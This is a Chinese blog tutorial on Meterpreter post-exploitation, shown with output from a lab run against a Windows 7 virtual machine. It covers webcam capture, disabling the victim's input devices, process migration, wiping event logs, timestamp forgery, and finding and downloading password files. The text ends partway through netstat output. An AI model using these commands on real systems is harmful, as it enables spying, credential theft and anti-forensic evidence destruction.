<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 后渗透之meterpreter使用攻略 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="后渗透之meterpreter使用攻略 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">后渗透之meterpreter使用攻略</h1><div class="post-time">Dec 20, 2018</div><div class="post-content"><!-- ttoc -->
<h2><span id="xi-tong-ming-ling">系统命令</span><a href="#xi-tong-ming-ling" class="header-anchor">#</a></h2><h3><span id="ji-ben-xi-tong-ming-ling">基本系统命令</span><a href="#ji-ben-xi-tong-ming-ling" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sessions    #sessions –h 查看帮助</span><br><span class="line">sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">run  #执行已有的模块，输入run后按两下tab，列出已有的脚本</span><br><span class="line">info #查看已有模块信息</span><br><span class="line">getuid # 查看权限 </span><br><span class="line">getpid # 获取当前进程的pid</span><br><span class="line">sysinfo # 查看目标机系统信息</span><br><span class="line">ps # 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程</span><br><span class="line">idletime #查看目标机闲置时间</span><br><span class="line">reboot / shutdown   #重启/关机</span><br><span class="line">shell #进入目标机cmd shell</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Win7</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 2852</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN-7</span><br><span class="line">OS              : Windows 7 (Build 7600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : UKNOWSEC</span><br><span class="line">Logged On Users : 3</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                     Arch  Session  User        Path</span><br><span class="line"> ---   ----  ----                     ----  -------  ----        ----</span><br><span class="line"> 0     0     [System Process]                                    </span><br><span class="line"> 4     0     System                                              </span><br><span class="line"> 248   500   svchost.exe                                         </span><br><span class="line"> 268   4     smss.exe                                            </span><br><span class="line"> 356   348   csrss.exe                                           </span><br><span class="line"> 396   348   wininit.exe                                         </span><br><span class="line"> 404   388   csrss.exe                                           </span><br><span class="line"> 440   388   winlogon.exe                                        </span><br><span class="line"> 500   396   services.exe                                        </span><br><span class="line"> 508   396   lsass.exe                                           </span><br><span class="line"> 516   396   lsm.exe                                             </span><br><span class="line"> 628   500   svchost.exe                                         </span><br><span class="line"> 648   500   svchost.exe                                         </span><br><span class="line"> 688   500   vmacthlp.exe                                        </span><br><span class="line"> 732   500   svchost.exe                                         </span><br><span class="line"> 772   500   svchost.exe                                         </span><br><span class="line"> 832   500   TrustedInstaller.exe                                </span><br><span class="line"> 860   500   svchost.exe                                         </span><br><span class="line"> 900   500   svchost.exe                                         </span><br><span class="line"> 1084  500   spoolsv.exe                                         </span><br><span class="line"> 1112  500   svchost.exe                                         </span><br><span class="line"> 1260  500   svchost.exe                                         </span><br><span class="line"> 1272  500   sppsvc.exe                                          </span><br><span class="line"> 1356  500   VGAuthService.exe                                   </span><br><span class="line"> 1396  628   WmiPrvSE.exe                                        </span><br><span class="line"> 1548  500   vmtoolsd.exe                                        </span><br><span class="line"> 1764  500   ManagementAgentHost.exe                             </span><br><span class="line"> 1780  500   wmpnetwk.exe                                        </span><br><span class="line"> 1908  500   svchost.exe                                         </span><br><span class="line"> 2036  500   msdtc.exe                                           </span><br><span class="line"> 2348  404   conhost.exe              x64   1        WIN-7\Win7  C:\Windows\System32\conhost.exe</span><br><span class="line"> 2356  2752  cmd.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\cmd.exe</span><br><span class="line"> 2532  500   svchost.exe                                         </span><br><span class="line"> 2684  500   taskhost.exe             x64   1        WIN-7\Win7  C:\Windows\System32\taskhost.exe</span><br><span class="line"> 2736  860   dwm.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\dwm.exe</span><br><span class="line"> 2752  2728  explorer.exe             x64   1        WIN-7\Win7  C:\Windows\explorer.exe</span><br><span class="line"> 2852  3380  shell.exe                x86   1        WIN-7\Win7  C:\Users\Win7\Desktop\shell.exe</span><br><span class="line"> 2876  2752  vmtoolsd.exe             x64   1        WIN-7\Win7  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</span><br><span class="line"> 3048  500   SearchIndexer.exe                                   </span><br><span class="line"> 3816  900   wuauclt.exe              x64   1        WIN-7\Win7  C:\Windows\System32\wuauclt.exe</span><br><span class="line"> 3824  500   svchost.exe                                         </span><br><span class="line"></span><br><span class="line">meterpreter &gt; idletime</span><br><span class="line">User has been idle for: 14 mins 20 secs</span><br></pre></td></tr></table></figure>
<h3><span id="uictl-kai-guan-jian-pan-shu-biao">uictl开关键盘/鼠标</span><a href="#uictl-kai-guan-jian-pan-shu-biao" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; uictl disable mouse</span><br><span class="line">Disabling mouse...</span><br><span class="line">meterpreter &gt; uictl disable keyboard</span><br><span class="line">Disabling keyboard...</span><br><span class="line">meterpreter &gt; uictl enable mouse</span><br><span class="line">Enabling mouse...</span><br><span class="line">meterpreter &gt; uictl enable keyboard</span><br><span class="line">Enabling keyboard...</span><br></pre></td></tr></table></figure>
<h3><span id="webcam-she-xiang-tou-ming-ling">webcam摄像头命令</span><a href="#webcam-she-xiang-tou-ming-ling" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list  #查看摄像头</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br></pre></td></tr></table></figure>
<h3><span id="execute-zhi-xing-wen-jian">execute执行文件</span><a href="#execute-zhi-xing-wen-jian" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -H -i -f cmd.exe</span><br><span class="line">Process 3616 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7600]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\Win7\Desktop&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="migrate-jin-cheng-qian-yi">migrate进程迁移</span><a href="#migrate-jin-cheng-qian-yi" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 2852</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                     Arch  Session  User        Path</span><br><span class="line"> ---   ----  ----                     ----  -------  ----        ----</span><br><span class="line"> 0     0     [System Process]                                    </span><br><span class="line"> 4     0     System                                              </span><br><span class="line"> 248   500   svchost.exe                                         </span><br><span class="line"> 268   4     smss.exe                                            </span><br><span class="line"> 356   348   csrss.exe                                           </span><br><span class="line"> 396   348   wininit.exe                                         </span><br><span class="line"> 404   388   csrss.exe                                           </span><br><span class="line"> 440   388   winlogon.exe                                        </span><br><span class="line"> 500   396   services.exe                                        </span><br><span class="line"> 508   396   lsass.exe                                           </span><br><span class="line"> 516   396   lsm.exe                                             </span><br><span class="line"> 628   500   svchost.exe                                         </span><br><span class="line"> 648   500   svchost.exe                                         </span><br><span class="line"> 688   500   vmacthlp.exe                                        </span><br><span class="line"> 732   500   svchost.exe                                         </span><br><span class="line"> 772   500   svchost.exe                                         </span><br><span class="line"> 832   500   TrustedInstaller.exe                                </span><br><span class="line"> 860   500   svchost.exe                                         </span><br><span class="line"> 900   500   svchost.exe                                         </span><br><span class="line"> 1084  500   spoolsv.exe                                         </span><br><span class="line"> 1112  500   svchost.exe                                         </span><br><span class="line"> 1260  500   svchost.exe                                         </span><br><span class="line"> 1272  500   sppsvc.exe                                          </span><br><span class="line"> 1356  500   VGAuthService.exe                                   </span><br><span class="line"> 1396  628   WmiPrvSE.exe                                        </span><br><span class="line"> 1548  500   vmtoolsd.exe                                        </span><br><span class="line"> 1764  500   ManagementAgentHost.exe                             </span><br><span class="line"> 1780  500   wmpnetwk.exe                                        </span><br><span class="line"> 1908  500   svchost.exe                                         </span><br><span class="line"> 2036  500   msdtc.exe                                           </span><br><span class="line"> 2348  404   conhost.exe              x64   1        WIN-7\Win7  C:\Windows\System32\conhost.exe</span><br><span class="line"> 2356  2752  cmd.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\cmd.exe</span><br><span class="line"> 2504  2752  calc.exe                 x64   1        WIN-7\Win7  C:\Windows\System32\calc.exe</span><br><span class="line"> 2532  500   svchost.exe                                         </span><br><span class="line"> 2684  500   taskhost.exe             x64   1        WIN-7\Win7  C:\Windows\System32\taskhost.exe</span><br><span class="line"> 2736  860   dwm.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\dwm.exe</span><br><span class="line"> 2752  2728  explorer.exe             x64   1        WIN-7\Win7  C:\Windows\explorer.exe</span><br><span class="line"> 2852  3380  shell.exe                x86   1        WIN-7\Win7  C:\Users\Win7\Desktop\shell.exe</span><br><span class="line"> 2876  2752  vmtoolsd.exe             x64   1        WIN-7\Win7  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</span><br><span class="line"> 3048  500   SearchIndexer.exe                                   </span><br><span class="line"> 3316  772   audiodg.exe              x64   0                    </span><br><span class="line"> 3816  900   wuauclt.exe              x64   1        WIN-7\Win7  C:\Windows\System32\wuauclt.exe</span><br><span class="line"> 3824  500   svchost.exe                                         </span><br><span class="line"></span><br><span class="line">meterpreter &gt; migrate 2876</span><br><span class="line">[*] Migrating from 3504 to 2876...</span><br><span class="line">[*] Migration completed successfully.</span><br></pre></td></tr></table></figure>
<h3><span id="clearev-qing-chu-ri-zhi">clearev清除日志</span><a href="#clearev-qing-chu-ri-zhi" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev</span><br><span class="line">[*] Wiping 365 records from Application...</span><br><span class="line">[*] Wiping 1222 records from System...</span><br><span class="line">[*] Wiping 404 records from Security...</span><br></pre></td></tr></table></figure>
<h2><span id="wen-jian-xi-tong-ming-ling">文件系统命令</span><a href="#wen-jian-xi-tong-ming-ling" class="header-anchor">#</a></h2><h3><span id="ji-ben-wen-jian-xi-tong-ming-ling">基本文件系统命令</span><a href="#ji-ben-wen-jian-xi-tong-ming-ling" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getwd 或者pwd # 查看当前工作目录  </span><br><span class="line">ls</span><br><span class="line">cd</span><br><span class="line">search -f *pass*       # 搜索文件  -h查看帮助</span><br><span class="line">cat c:\\lltest\\lltestpasswd.txt  # 查看文件内容</span><br><span class="line">upload /tmp/hack.txt C:\\lltest  # 上传文件到目标机上</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/ # 下载文件到本机上</span><br><span class="line">edit c:\\1.txt #编辑或创建文件  没有的话，会新建文件</span><br><span class="line">rm C:\\lltest\\hack.txt</span><br><span class="line">mkdir lltest2  #只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  #只能删除当前目录下文件夹</span><br><span class="line">getlwd   或者 lpwd   #操作攻击者主机 查看当前目录</span><br><span class="line">lcd /tmp   #操作攻击者主机 切换目录</span><br></pre></td></tr></table></figure>
<h3><span id="timestomp-wei-zao-shi-jian-chuo">timestomp伪造时间戳</span><a href="#timestomp-wei-zao-shi-jian-chuo" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; timestomp -v C://2.txt</span><br><span class="line">[*] Showing MACE attributes for C://2.txt</span><br><span class="line">Modified      : 2018-12-18 00:48:02 -0500</span><br><span class="line">Accessed      : 2018-12-18 00:48:02 -0500</span><br><span class="line">Created       : 2018-12-17 22:52:59 -0500</span><br><span class="line">Entry Modified: 2018-12-18 00:48:10 -0500</span><br><span class="line">meterpreter &gt; timestomp -v C://1.txt</span><br><span class="line">[*] Showing MACE attributes for C://1.txt</span><br><span class="line">Modified      : 2018-12-17 22:52:44 -0500</span><br><span class="line">Accessed      : 2018-12-17 22:52:59 -0500</span><br><span class="line">Created       : 2018-12-17 22:52:59 -0500</span><br><span class="line">Entry Modified: 2018-12-17 22:52:59 -0500</span><br><span class="line">meterpreter &gt; timestomp C://2.txt -f C://1.txt</span><br><span class="line">[*] Pulling MACE attributes from C://1.txt</span><br><span class="line">[*] Setting specific MACE attributes on C://2.txt</span><br><span class="line">meterpreter &gt; timestomp -v C://2.txt</span><br><span class="line">[*] Showing MACE attributes for C://2.txt</span><br><span class="line">Modified      : 2018-12-17 22:52:44 -0500</span><br><span class="line">Accessed      : 2018-12-17 22:52:59 -0500</span><br><span class="line">Created       : 2018-12-17 22:52:59 -0500</span><br><span class="line">Entry Modified: 2018-12-17 22:52:59 -0500</span><br></pre></td></tr></table></figure>
<h2><span id="wang-luo-ming-ling">网络命令</span><a href="#wang-luo-ming-ling" class="header-anchor">#</a></h2><h3><span id="ji-ben-wang-luo-ming-ling">基本网络命令</span><a href="#ji-ben-wang-luo-ming-ling" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:ba:a6:a7</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 192.168.130.128</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::c55f:725f:9e7d:7056</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 12</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::5efe:c0a8:16ab</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line">IPv6 Address : fe80::5efe:c0a8:8280</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 13</span><br><span class="line">============</span><br><span class="line">Name         : Teredo Tunneling Pseudo-Interface</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::100:7f:fffe</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 14</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection #2</span><br><span class="line">Hardware MAC : 00:0c:29:ba:a6:b1</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 192.168.22.171</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::b96b:f6e6:3371:444f</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line">meterpreter &gt; netstat -ano</span><br><span class="line"></span><br><span class="line">Connection list</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Proto  Local address                    Remote address       State        User  Inode  PID/Program name</span><br><span class="line">    -----  -------------                    --------------       -----        ----  -----  ----------------</span><br><span class="line">    tcp    0.0.0.0:135                      0.0.0.0:*            LISTEN       0     0      732/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:445                      0.0.0.0:*            LISTEN       0     0      4/System</span><br><span class="line">    tcp    0.0.0.0:554                      0.0.0.0:*            LISTEN       0     0      1780/wmpnetwk.exe</span><br><span class="line">    tcp    0.0.0.0:5357                     0.0.0.0:*            LISTEN       0     0      4/System</span><br><span class="line">    tcp    0.0.0.0:49152                    0.0.0.0:*            LISTEN       0     0      396/wininit.exe</span><br><span class="line">    tcp    0.0.0.0:49153                    0.0.0.0:*            LISTEN       0     0      772/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:49154                    0.0.0.0:*            LISTEN       0     0      900/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:49171                    0.0.0.0:*            LISTEN       0     0      508/lsass.exe</span><br><span class="line">    tcp    0.0.0.0:49176                    0.0.0.0:*            LISTEN       0     0      500/services.exe</span><br><span class="line">    tcp    0.0.0.0:49179                    0.0.0.0:*            LISTEN       0     0      1908/svchost.exe</span><br><span class="line">    tcp    192.168.22.171:139               0.0.0.0:*            LISTEN       0     0      4/System</span><br><span class="line">    tcp    192.168.22.171:58500             192.168.22.170:4444  ESTABLISHED  0     0      2876/vmtoolsd.exe</span><br><span class="line">    tcp    192.168.22.171:58879             192.168.22.170:4444  ESTABLISHED  0     0      1684/shell.exe</span><br><span class="line">    tcp    192.168.130.128:139              0.0.0.0:*            LISTEN       0     0      4/System</span><br><span class="line">    tcp6   :::135                           :::*                 LISTEN       0     0      732/svchost.exe</span><br><span class="line">    tcp6   :::445                           :::*                 LISTEN       0     0      4/System</span><br><span class="line">    tcp6   :::554                           :::*                 LISTEN       0     0      1780/wmpnetwk.exe</span><br><span class="line">    tcp6   :::3587                          :::*                 